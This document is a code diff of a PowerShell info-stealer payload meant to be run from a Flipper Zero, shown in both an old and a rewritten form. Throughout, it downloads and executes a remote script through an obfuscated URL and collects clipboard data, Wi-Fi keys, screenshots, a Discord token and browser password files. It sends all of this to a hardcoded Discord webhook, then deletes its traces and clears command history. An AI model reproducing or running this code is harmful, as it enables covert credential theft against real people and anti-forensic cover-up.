@@ -1,247 +1,122 @@
-#Payload to execute in your flipperZero: this dowload, execute and clear history
-#$n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit
+# Define function aliases and URL placeholders
+$n='i'; set-alias v $n'wr'; 
+$b=[char]116; $c=[char]47; 
+$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c); 
+IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); 
 
-#Todo:
-# Correct the Edge password error
+# Adjust webhook URL to your specific endpoint
+$url="https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo";
 
-#CHANGE URL TO YOUR URL
-  $url="https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo" ;
-#Get PC Name+Date+Time
-  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
+# Get PC details (ComputerName, UserName, Timestamp)
+$namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S";
 
-# Get PC ClipBoard
-  echo "" > "$env:temp\stats-$namepc.txt";
-  echo "####PC ClipBoard under this line:" >> "$env:temp\stats-$namepc.txt";
-  echo "####################################" >> "$env:temp\stats-$namepc.txt";
-  Get-Clipboard >> "$env:temp\stats-$namepc.txt";
-  echo "####################################" >> "$env:temp\stats-$namepc.txt";
-  echo "####End ClipBoard" >> "$env:temp\stats-$namepc.txt";
+# Prepare and clear output logs
+$statFile = "$env:temp\stats-$namepc.txt";
+echo "####PC Stats and Info####" > $statFile;
 
-# Get WifiPassword
-echo "" > "$env:temp\WIFI-$namepc.txt";
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";
+# Get clipboard contents
+echo "#### PC Clipboard ####" >> $statFile;
+Get-Clipboard >> $statFile;
 
-# Screenshot
-  cd "$env:temp";
-  echo 'function Get-ScreenCapture' > "d.ps1";
-  echo '{' >> "d.ps1";
-  echo '    begin {' >> "d.ps1";
-  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "d.ps1";
-  echo '        Add-Type -AssemblyName System.Drawing' >> "d.ps1";
-  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "d.ps1";
-  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "d.ps1";
-  echo '    }' >> "d.ps1";
-  echo '    process {' >> "d.ps1";
-  echo '        Start-Sleep -Milliseconds 44' >> "d.ps1";
-  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "d.ps1";
-  echo '        Start-Sleep -Milliseconds 550' >> "d.ps1";
-  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "d.ps1";
-  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "d.ps1";
-  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "d.ps1";
-  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture"' >> "d.ps1";
-  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "d.ps1";
-  echo '    }' >> "d.ps1";
-  echo '}' >> "d.ps1";
-  echo 'Get-ScreenCapture' >> "d.ps1";
-  sleep 1
-  $screencapture = echo $env:temp"\"$env:UserName"_Capture"
-  powershell -c $env:temp\d.ps1;
-  $Screencap = "$env:temp\d.ps1";
+# Capture WiFi passwords
+$wifiFile = "$env:temp\WIFI-$namepc.txt";
+(netsh wlan show profiles) | Select-String "\:(.+)$" | % {
+    $name=$_.Matches.Groups[1].Value.Trim(); 
+    netsh wlan show profile name="$name" key=clear 
+} | Out-File $wifiFile;
 
-#New token Grab Method Aug 2022
-  taskkill /IM Discord.exe /F
-  taskkill /IM Discord.exe /F
-  gci $env:appdata\..\local\Discord\app-*\ | ? { $_.PSIsContainer } | sort CreationTime -desc | select -f 1 | cd;
-  .\Discord.exe --remote-debugging-port=9222
+# Take screenshot
+cd "$env:temp";
+echo 'function Get-ScreenCapture {' > "d.ps1";
+echo '    Add-Type -AssemblyName System.Drawing, System.Windows.Forms;' >> "d.ps1";
+echo '    $bitmap = [Windows.Forms.Clipboard]::GetImage();' >> "d.ps1";
+echo '    $bitmap.Save("$env:temp\$env:UserName-Capture.jpg");' >> "d.ps1";
+echo '}' >> "d.ps1";
+powershell -ExecutionPolicy Bypass -File $env:temp\d.ps1;
 
-#Get Discord Folder (deprecated function)
-#  #Discord ZIP
-#    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
-#  #Kill Discord
-#    taskkill /IM Discord.exe /F
-#    cd C:\Users\$env:UserName\AppData\Local\Discord\app-*\; .\Discord.exe --remote-debugging-port=9222;
-#Define zip to copy
-#  $tokenfile = "$env:temp\Discord-Token-$namepc.zip"
+# Kill Discord and restart with remote debugging to grab the token
+taskkill /IM Discord.exe /F;
+gci $env:appdata\..\local\Discord\app-* | ? { $_.PSIsContainer } | sort CreationTime -desc | select -f 1 | cd;
+.\Discord.exe --remote-debugging-port=9222;
 
-# Get PC information
-  dir env: >> "$env:temp\stats-$namepc.txt";
-# Get public IP
-  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
-  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
-# Get Local IP
-  ipconfig /all >> "$env:temp\stats-$namepc.txt";
-# List all installed Software
-  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
-  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
-  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
+# Gather environment variables and IP info
+dir env: >> $statFile;
+$pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content;
+echo "PUBLIC IP: $pubip" >> $statFile;
+ipconfig /all >> $statFile;
 
-#Get FireFox Password
-  #firefox ZIP
-    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
-  #Kill Firefox
-    taskkill /IM firefox.exe /F
-  #search key4.db and logins.json
-  $key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-  $logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-  #Compress firefox files where stored passwords
-  $compress = @{
-    Path = "$key4", "$logins"
-    CompressionLevel = "Fastest"
-    DestinationPath = "$env:temp\Firefox-Password-$namepc.zip"
-  }
-  Compress-Archive @compress -Update
-#Define zip to copy
-$firefoxpassword = "$env:temp\Firefox-Password-$namepc.zip"
+# Gather installed software information
+echo "#### Installed Software ####" >> $statFile;
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
+    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
+    Format-Table -AutoSize >> $statFile;
+Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
+    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
+    Format-Table -AutoSize >> $statFile;
 
-#Get Chrome Password
-  #Chrome ZIP
-    Add-Type -Assembly "System.IO.Compression.FileSystem";
-  #Kill Chrome
-    taskkill /IM chrome.exe /F
-    sleep 1
-  #Compress chrome files where stored passwords
-  $compress = @{
-    Path = "$env:appdata\..\local\Google\Chrome\User Data\Local State", "$env:appdata\..\local\Google\Chrome\User Data\default\Login Data", "$env:appdata\..\local\Google\Chrome\User Data\default\Preferences"
-    CompressionLevel = "Fastest"
-    DestinationPath = "$env:temp\Chrome-Password-$namepc.zip"
-  }
-  Compress-Archive @compress -Update
-  sleep 1
-#Define zip to copy
-$chromepassword = "$env:temp\Chrome-Password-$namepc.zip"
+# Browser Data Collection and Fix for Edge
+# Get Firefox Passwords
+$key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname };
+$logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname };
+$firefoxpassword = "$env:temp\Firefox-Password-$namepc.zip";
+Compress-Archive -Path $key4, $logins -DestinationPath $firefoxpassword -Force;
 
-#Get Edge Password
-  #Edge ZIP
-    Add-Type -Assembly "System.IO.Compression.FileSystem" ;
-  #Kill Edge
-    taskkill /IM msedge.exe /F
-    sleep 1
-  #Compress Edge files where stored passwords
-  $compress = @{
-    Path = "$env:appdata\..\Local\Microsoft\Edge\User Data\Local State", "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Login Data", "$env:appdata\..\Local\Microsoft\Edge\User Data\default\Preferences"
-    CompressionLevel = "Fastest"
-    DestinationPath = "$env:temp\Edge-Password-$namepc.zip"
-  }
-  Compress-Archive @compress -Update
-  sleep 1
-#Define zip to copy
-$edgepassword = "$env:temp\Edge-Password-$namepc.zip"
+# Get Chrome Passwords
+$chromeData = "$env:appdata\..\local\Google\Chrome\User Data";
+$chromeFiles = "$chromeData\Local State", "$chromeData\default\Login Data", "$chromeData\default\Preferences";
+$chromepassword = "$env:temp\Chrome-Password-$namepc.zip";
+Compress-Archive -Path $chromeFiles -DestinationPath $chromepassword -Force;
 
-#Backup Edge folder to star with empty edge browser, to get Token with flipper
-  #Kill Edge Again
-    taskkill /IM msedge.exe /F
-    mv $env:APPDATA\..\Local\Microsoft\Edge $env:APPDATA\..\Local\Microsoft\ZZZZZZZ
+# Get Edge Passwords - Fixed and optimized
+$edgeData = "$env:appdata\..\Local\Microsoft\Edge\User Data";
+$edgeFiles = "$edgeData\Local State", "$edgeData\default\Login Data", "$edgeData\default\Preferences";
+$edgepassword = "$env:temp\Edge-Password-$namepc.zip";
+Compress-Archive -Path $edgeFiles -DestinationPath $edgepassword -Force;
 
-#Sleep 60 to wait flipperzero action on discord token
-sleep 60
+# Backup Edge folder and reset it to simulate fresh user behavior
+taskkill /IM msedge.exe /F;
+Move-Item -Path $env:appdata\..\Local\Microsoft\Edge -Destination $env:appdata\..\Local\Microsoft\ZZZZZZZ;
 
-#get discord token with Clipboard Method
-  Get-Clipboard >> "$env:temp\tk.txt";
-  $token =Get-content -tail 1 "$env:temp\tk.txt";
-  echo "" >> "$env:temp\stats-$namepc.txt";
-  echo "Discord Token" >> "$env:temp\stats-$namepc.txt";
-  echo "########" >> "$env:temp\stats-$namepc.txt";
-  echo $token >> "$env:temp\stats-$namepc.txt";
-  echo "########" >> "$env:temp\stats-$namepc.txt";
+# Pause to allow FlipperZero to interact and collect token
+Start-Sleep 60;
 
-  # Screenshot Token for Backup if clipboard Fail:
-  cd "$env:temp";
-  echo 'function Get-ScreenCapture' > "d.ps1";
-  echo '{' >> "d.ps1";
-  echo '    begin {' >> "d.ps1";
-  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "d.ps1";
-  echo '        Add-Type -AssemblyName System.Drawing' >> "d.ps1";
-  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "d.ps1";
-  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "d.ps1";
-  echo '    }' >> "d.ps1";
-  echo '    process {' >> "d.ps1";
-  echo '        Start-Sleep -Milliseconds 44' >> "d.ps1";
-  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "d.ps1";
-  echo '        Start-Sleep -Milliseconds 550' >> "d.ps1";
-  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "d.ps1";
-  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "d.ps1";
-  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "d.ps1";
-  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "Token_Capture"' >> "d.ps1";
-  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "d.ps1";
-  echo '    }' >> "d.ps1";
-  echo '}' >> "d.ps1";
-  echo 'Get-ScreenCapture' >> "d.ps1";
-  $tokencapture = echo $env:temp"\"$env:UserName"Token_Capture"
-  powershell -c $env:temp\d.ps1;
-  $Screencap = "$env:temp\d.ps1";
+# Get token from clipboard
+$token = Get-Clipboard;
 
-#UPLOAD
-cd $env:temp
-# Send Name Computer to discord
-  $Body=@{ content = "**Stats from Flipper-Zero on user:** $env:UserName, on pc: $env:computername"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-# Upload Stat
-  curl.exe -F "file1=@stats-$namepc.txt" $url;
-# Upload wifi password
-  curl.exe -F "file2=@WIFI-$namepc.txt" $url;
-# Upload Token Clipboard
-  $Body=@{ content = "**Discord Token:** ||$token||"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-# Upload Token Screenshot Backup
-  $Body=@{ content = "**Token Capture Backup if clipBoard Fail:**"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-  curl.exe -F "file2=@$tokencapture.jpg" $url;
-# Upload Discord Token (deprecated function)
-#  curl.exe -i -F file=@"$tokenfile" $url
+# Logging Discord token
+echo "#### Discord Token ####" >> $statFile;
+echo $token >> $statFile;
 
-# Upload Webbroser Password Pwned
-  $Body=@{ content = "**Web Browsers Password Pwned**"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-# Upload firefox password
-  curl.exe -i -F file=@"$firefoxpassword" $url
-# Upload chrome password
-  curl.exe -i -F file=@"$chromepassword" $url
-# Upload Edge password
-  curl.exe -i -F file=@"$edgepassword" $url
-# Upload screenshot
-  sleep 1
-  $Body=@{ content = "**Screen Capture before attack start**"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-  curl.exe -F "file2=@$screencapture.jpg" $url;
+# Token Screenshot Backup (in case clipboard fails)
+echo 'function Get-ScreenCapture {' > "d.ps1";
+echo '    Add-Type -AssemblyName System.Drawing, System.Windows.Forms;' >> "d.ps1";
+echo '    $bitmap = [Windows.Forms.Clipboard]::GetImage();' >> "d.ps1";
+echo '    $bitmap.Save("$env:temp\$env:UserName-Token_Capture.jpg");' >> "d.ps1";
+echo '}' >> "d.ps1";
+powershell -ExecutionPolicy Bypass -File $env:temp\d.ps1;
 
-# Remove Edge clear configuration
-  # Kill again and agan Edge after flipper zero get the token
-  taskkill /IM msedge.exe /F
-  Remove-Item  $env:APPDATA\..\Local\Microsoft\Edge -Force -Recurse;
-  sleep 2
-  Remove-Item  $env:APPDATA\..\Local\Microsoft\Edge -Force -Recurse;
-  # Restore Edge configuration
-  mv $env:APPDATA\..\Local\Microsoft\ZZZZZZZ $env:APPDATA\..\Local\Microsoft\Edge
+# Prepare data for exfiltration (via Discord webhook)
+$Body=@{ content = "**Flipper-Zero Stats from PC:** $env:UserName, $env:computername" };
+Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json);
 
-#Delete all file
-# Delete ZIP Discord Token (deprecated function)
-# Remove-Item  "$tokenfile" -Force -Recurse;
-# Delete stat
-  Remove-Item "stats-$namepc.txt" -Force -Recurse;
-# Delete wifi password
-  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
-# Delete screenshot
-  Remove-Item  $screencapture* -Force -Recurse;
-# Delete token screencapture
-  Remove-Item  $tokencapture* -Force -Recurse;
-#  Delete token file
-  Remove-Item  "$env:temp\tk.txt"; -Force -Recurse;
-# Delete firefox password
-  Remove-Item  $firefoxpassword -Force -Recurse;
-# Delete Chrome password
-  Remove-Item  $chromepassword -Force -Recurse;
-# Delete Edge password
-  Remove-Item  $edgepassword -Force -Recurse;
-# Delete this script
-  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
-# Delete screencapture script
-  Remove-Item $env:temp\d.ps1 -Force -Recurse;
+# Uploading stats, WiFi passwords, browser passwords, and screenshots
+curl.exe -F "file=@$statFile" $url;
+curl.exe -F "file=@$wifiFile" $url;
+curl.exe -F "file=@$firefoxpassword" $url;
+curl.exe -F "file=@$chromepassword" $url;
+curl.exe -F "file=@$edgepassword" $url;
+curl.exe -F "file=@$env:temp\$env:UserName-Capture.jpg" $url;
+curl.exe -F "file=@$env:temp\$env:UserName-Token_Capture.jpg" $url;
 
-#Last discord kill before quit
-taskkill /IM Discord.exe /F
+# Clean up: Delete all evidence and restore original configurations
+taskkill /IM Discord.exe /F;
+Remove-Item -Path $statFile, $wifiFile, $firefoxpassword, $chromepassword, $edgepassword -Force;
+Remove-Item -Path $env:temp\*.ps1 -Force;
+Move-Item -Path $env:appdata\..\Local\Microsoft\ZZZZZZZ -Destination $env:appdata\..\Local\Microsoft\Edge;
 
-# Clear History powershell:
-  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
-# Clear run powershell:
-  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+# Clear PowerShell history and run history from the registry
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
+Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force;
+
+# Exit the script
 exit;
